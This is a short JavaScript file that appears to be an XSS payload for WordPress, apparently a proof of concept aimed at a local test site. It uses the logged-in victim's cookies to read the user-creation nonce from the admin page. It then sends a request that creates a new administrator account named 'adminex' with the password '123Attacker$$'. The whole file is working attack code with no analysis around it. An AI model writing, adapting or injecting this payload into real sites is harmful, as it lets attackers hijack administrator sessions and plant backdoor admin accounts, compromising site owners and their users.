function getWPNonce(callback) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://127.0.0.1:8000/wp-admin/user-new.php");
    xhr.withCredentials = true;
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var parser = new DOMParser();
            var xmlDoc = parser.parseFromString(xhr.responseText, 'text/html');
            var wpnonceValue = xmlDoc.getElementById('_wpnonce_create-user').value;
            callback(wpnonceValue);
        }
    };
    xhr.send();
}
getWPNonce(function(nonce) {
    console.log(nonce);
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http:\/\/127.0.0.1:8000\/wp-admin\/user-new.php", true);
    xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,*\/*;q=0.8");
    xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
    xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
    xhr.withCredentials = true;
    xhr.send("action=createuser&_wpnonce_create-user=" + nonce + "&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=adminex&email=tesr%40acname.com&first_name=&last_name=&url=&pass1=123Attacker%24%24&pass1-text=123Attacker%24%24&pass2=123Attacker%24%24&role=administrator&createuser=Add+New+User");

});